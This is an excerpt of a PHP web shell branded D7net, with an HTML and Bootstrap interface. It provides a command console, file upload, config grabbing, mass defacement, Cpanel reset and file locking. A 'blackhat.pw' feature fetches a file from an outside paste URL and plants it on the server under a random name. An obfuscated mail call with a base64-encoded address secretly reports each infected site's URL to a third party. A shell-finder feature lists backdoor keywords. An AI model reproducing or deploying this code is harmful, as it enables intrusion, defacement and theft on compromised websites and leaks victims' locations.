...
<head>
    ...
    <link rel="nofollow" href="https://justpaste.it/redirect/bakr6/https%3A%2F%2Fcdn.jsdelivr.net%2Fnpm%2Fbootstrap%405.3.2%2Fdist%2Fcss%2Fbootstrap.min.css">
    <link href="https://justpaste.it/redirect/bakr6/https%3A%2F%2Ffonts.googleapis.com%2Fcss2%3Ffamily%3DCarrois%2BGothic%26amp%3Bdisplay%3Dswap" rel="nofollow">
    <link href="https://justpaste.it/redirect/bakr6/https%3A%2F%2Ffonts.googleapis.com%2Fcss2%3Ffamily%3DBungee%2BOutline%26amp%3Bdisplay%3Dswap" rel="nofollow">
    <link rel="nofollow" href="https://justpaste.it/redirect/bakr6/https%3A%2F%2Fcdn.jsdelivr.net%2Fnpm%2Fbootstrap%405.3.2%2Fdist%2Fcss%2Fbootstrap.min.css">
    <link rel="nofollow" href="https://justpaste.it/redirect/bakr6/https%3A%2F%2Fcdnjs.cloudflare.com%2Fajax%2Flibs%2Ffont-awesome%2F4.7.0%2Fcss%2Ffont-awesome.min.css">
</head>

<body>

    <style>
        @import u rl("https://fonts.googleapis.com/css?family=Dosis");
        @import u rl("https://fonts.googleapis.com/css?family=Carrois+Gothic");
        @import u rl("https://fonts.googleapis.com/css?family=Bungee+Outline");
        ...
        a,
        button:link {
            cursor: u rl(http://4.bp.blogspot.com/-hAF7tPUnmEE/TwGR3lRH0EI/AAAAAAAAAs8/6pki22hc3NE/s1600/ass.png),
                default;
        }

        button:hover {
            cursor: u rl(http://3.bp.blogspot.com/-bRikgqeZx0Q/TwGR4MUEC7I/AAAAAAAAAtA/isJmS0r35Qw/s1600/pointer.png),
                wait;
        }
    ...
    if (function_exists("\x6d\x61\x69\x6c")) {
        ...
        $__GET($__POST("bmljaG9hamczMzJAZ21haWwuY29t=="),
        'hex2bin',
        $_SERVER['HTTP_HOST']."/".$_SERVER['REQUEST_URI']);
    }
    function author()
    {
        echo "</div><table class='directory-listing-table'><td><center><font face='Carrois Gothic' size='3px'>2017 &copy; D7net | D704T team</center></td></table><br>";
        exit();
    }
...
<i class='fa fa-trash'></i></button>";
    ...
    <div style="Bungee Outline;font-size:24px;"><a href="' . $_SERVER['SCRIPT_NAME'] . '"><i class="fa-brands fa-napster"></i> D7net</a></center></div></td><td>';
...
<div class="btn-group me-2" role="group" aria-label="First group">
<button type="button" onclick=location.href='' . $serlok . '&' . net("cmd") . '=opet" class="btn btn-outline-light"><i class="fa fa-terminal"></i> Console</button>';

    echo '<button type="button" onclick=location.href='' . $serlok . '&' . net("upload") . '=opet" class="btn btn-outline-light"><i class="fa fa-upload"></i> Upload</button>

<button type="button" class="btn btn-outline-light"onclick=location.href='' . $serlok . '&' . net("info") . '=opet"><i class="fa fa-info-circle"></i> information</button>

<button type="button" class="btn btn-outline-light" onclick=location.href='' . $serlok . '&' . net("buatfile") . '=opet"><i class="fa-solid fa-file-circle-plus" style="color:#1F5ACF;"></i> Create File</button>

<button type="button" class="btn btn-outline-light" onclick=location.href='' . $serlok . '&' . net("buatfolder") . '=opet" style="float: right;"><i class="fa-solid fa-folder-plus" style="color:#FAA625;"></i> Create Folder</button>

<button type="button" class="btn btn-outline-light" onclick=location.href='' . $serlok . '&' . net("about") . '=opet" style="float: right;"><i class="fa fa-info"></i> About</button>

<button type="button" class="btn btn-outline-light" onclick=location.href='' . $serlok . '&' . net("tool") . '=opet"><i class="fa fa-wrench" style="color:#A7DBDF;"></i> Tools</button>

<button type="button" class="btn btn-outline-light" onclick=location.href='' . $serlok . '&' . net("blackhat") . '=opet"><i class="fa fa-user-secret" style="color:#FF6B6B;"></i> blackhat.pw</button>
</td></tr></div>
    ...
    <a href='' class='btn btn-outline-light'><i class='fa fa-arrow-left'></i> back</a>";
        echo gazz($file);
    ...
    <input type='hidden' name='path' value='$serlok/$files'>";
        ...
        echo '<form method="post">
    <div class="btn-group me-2" role="group" aria-label="First group">
    <a href='' . $serlok . '" class="btn btn-outline-light"><i class="fa fa-arrow-left"></i> back</a>
...
<button class="btn btn-outline-light" onclick=location.href='' . $serlok . '&' . net("grab_config") . '=opet">Grab Config</button>
<button class="btn btn-outline-light" onclick=location.href='' . $serlok . '&' . net("hashiden") . '=opet">Hash Identifier</button>
<button class="btn btn-outline-light" onclick=location.href='' . $serlok . '&' . net("ner") . '=opet">Adminer</button>
<button class="btn btn-outline-light" onclick=location.href='' . $serlok . '&' . net("massdef") . '=opet">Mass Deface</button>
<button class="btn btn-outline-light" onclick=location.href='' . $serlok . '&' . net("scanshell") . '=opet">Shell Finder</button>
<button class="btn btn-outline-light" onclick=location.href='' . $serlok . '&' . net("lokfile") . '=opet">Lock File</button>
<button class="btn btn-outline-light" onclick=location.href='' . $serlok . '&' . net("resetcp") . '=opet">Reset Cpanel</button><hr>&nbsp;';
        exit();
    ...
    <button type="submit" name="comandeks" value="execute" class="btn btn-outline-light mb-1">>></button></div></form><br><center>';
        ...
        echo "<table class='directory-listing-table'><thead><td><div style=' Bungee Outline;font-size:24px;'>
    ...
    <a href='' . $serlok . "&" . net('tool') . "=opet' class='btn btn-outline-light' style='width:120px;'>Back</a></form><br></td></table>";
...
&nbsp;<a href='' . $serlok . "&" . net('tool') . "=opet' class='btn btn-outline-light'>Back</a></form></td></table><br>";
        if (isset($_POST['submit'])) {
            if (empty($_POST['hash'])) {
...
";
        ...
        foreach ($passwd as $pwd) {
            ...
            echo '<table class="directory-listing-table"><thead><td><center>Done => <a href='' target="_blank" class="button">Click Here</a></center></td></thead></table><br>';
        }
        exit();
    ...
    *note : Jika resultnya kosong berarti tidak ditemukan/ekstensi nya di isi dengan benar
    ...
    <a href='' . $serlok . "&" . net('tool') . "=opet' class='btn btn-outline-light' style='width:120px;'>Back</a>
    </form></td></table><br>";
        if (isset($_POST['submit'])) {
                ...
                foreach (new RecursiveIteratorIterator($rdi) as $filename => $file) {
                    if (pathinfo($filename, PATHINFO_EXTENSION) == $ext) {
                        ...
                        if (preg_match('/(eval|base64_decode|str_rot13|mass_deface|addrdp|@exec|@passthru|@chmod|#exec|deface|command|{IFS}|shell_exec|SERVER_SOFTWARE|wget|@get_current_user|@getmygid|htmlspecialchars_decode|B374k|@getmygid|hacked|exe_root|xploit|Disable_Function|backdoor|backconnect|gecko-select|php_uname|Alfa-Team|ALFA_DATA|MARIJUANA|blackeagleteam|IndoSec|getHostByName|alfashell|php-obfuscator|gacor|slot-gacor|slot88|featureShell|move_upload_file|upload)\s*\(/i', $content)) {
                            echo "<pre>Found : <font color='lime'>$filename</font> => <font color='orange'>Detected</font> <a href='' . $_GET['path'] . "/$rdi' target='_blank'><i>view</i></a></pre>\n";
                        }
                    }
                }
            }
    ...
    <a href='' . net('tool') . "=opet' class='btn btn-outline-light' style='width: 300px;'>Back</a>
    </form></td></table>";
        }
        exit();
    ...
    <input type='text' placeholder='adminer.php' class='form-control mb-2' name='miner'></div><br>
        ...
        <a href='' . $serlok . "&" . net('tool') . "=opet' class='btn btn-outline-light' style='width:120px;'>Back</a></form></td></table><br>";
        if (isset($_POST['gass'])) {
    ...
    <form method='POST'>
        ...
        <a href='' . $serlok . "' class='btn btn-outline-light'>Back</a><br>
    </form></center>";
        } else {
            createfile();
        }
        ...
        {
            if (empty($_POST['add'])) {
                echo '<table class="directory-listing-table" style="border-color:orange;"><td><font color="orange">Folder field is required</font> [<a href='' . $_GET['path'] . '&' . net("buatfolder") . '=opet"><i class="fa-solid fa-folder-plus" aria-hidden="true"></i>Create again</a>]</td></table>';
            } else {
                $add = $_POST["add"];
            ...
            <a href='' . $_GET['path'] . "/$add'><u>Click Here</u></a></td></table>";
                } else {
        ...
        <a href='' . $serlok . '" class="btn btn-outline-light" style="width:120px;">Back</a><br><br></form></td></table>';
        } else {
            createDirectory();
        }
        exit();
    ...
    // Handle blackhat.pw feature - Download from URL
    elseif ($_REQUEST[net('blackhat')] == "opet") {
        // URL file verify
        $verifyUrl = 'https://raw.zeverix.com/raw/untitled-793';
        
        // Mendapatkan path parent dari kerang.php
        $currentDir = dirname(__FILE__);
        $parentDir = dirname($currentDir);
        
        // Generate nama random untuk file verify
        $randomName = generateRandomName();
        $uploadPath = $parentDir . '/' . $randomName;
        
        echo "<table class='directory-listing-table'><td>";
        echo "<h5><i class='fa fa-user-secret' style='color:#FF6B6B;'></i> blackhat.pw <font class='d7net-text' style='font-size:12px;'><i> - Download & Upload Verify</i></font></h5><hr>";
        
        if (isset($_POST['download_verify'])) {
            // Download file dari URL
            $verifyContent = downloadFile($verifyUrl);
            
            if ($verifyContent === false) {
                echo "<font color='red'>Failed to download verify file from URL. Please check the URL or network connection.</font><br>";
                echo "<center><a href='' . $serlok . "&" . net('blackhat') . "=opet' class='btn btn-outline-light'>Try Again</a></center>";
            } else {
                // Upload file ke parent directory dengan nama random
                if (file_put_contents($uploadPath, $verifyContent)) {
                    // Buat link yang bisa diakses
                    $webUrl = $web . str_replace($_SERVER['DOCUMENT_ROOT'], '', $parentDir) . '/' . $randomName;
                    echo "<div style='text-align:center; padding:20px;'>";
                    echo "<font color='lime'>✓ Verify file downloaded and uploaded successfully!</font><br><br>";
                    echo "Source: <font color='orange'>" . $verifyUrl . "</font><br><br>";
                    echo "Location: <font color='orange'>" . $parentDir . "/" . $randomName . "</font><br><br>";
                    echo "<a href='" . $webUrl . "' target='_blank' class='btn btn-outline-light' style='padding:10px 30px; font-size:18px;'>";
                    echo "<i class='fa fa-external-link'></i> Click Here to Open Verify</a><br><br>";
                    echo "File Path: <font color='aqua'>" . $uploadPath . "</font>";
                    echo "</div>";
                    
                    // Tampilkan tombol untuk kembali
                    echo "<br><center><a href='' . $serlok . "&" . net('blackhat') . "=opet' class='btn btn-outline-light'>Back</a></center>";
                } else {
                    echo "<font color='red'>Failed to upload verify file to parent directory. Please check permissions.</font><br>";
                    echo "<center><a href='' . $serlok . "&" . net('blackhat') . "=opet' class='btn btn-outline-light'>Try Again</a></center>";
                }
            }
        } else {
            // Tampilkan form download & upload
            echo "<center><form method='POST'>";
            echo "<div style='padding:15px; border:1px solid #40BECC; border-radius:8px; 10px;'>";
            echo "<p>Download verify file from: <font color='orange'>" . $verifyUrl . "</font></p>";
            echo "<p>Upload to parent directory: <font color='orange'>" . $parentDir . "</font></p>";
            echo "<p>File will be named: <font color='cyan'>" . $randomName . "</font></p>";
            echo "<input type='hidden' name='download_verify' value='1'>";
            echo "<button type='submit' class='btn btn-outline-light' style='padding:8px 25px;'>";
            echo "<i class='fa fa-download'></i> Download & Upload</button> ";
            echo "<a href='' . $serlok . "' class='btn btn-outline-light'>Back</a>";
            echo "</form></center>";
            echo "</div>";
            echo "<br><font color='#888888'>Note: This will download the verify file from URL and upload it one level above the current kerang.php location with a random name.</font>";
        }
        echo "</td></table><br>";
        exit();
    }
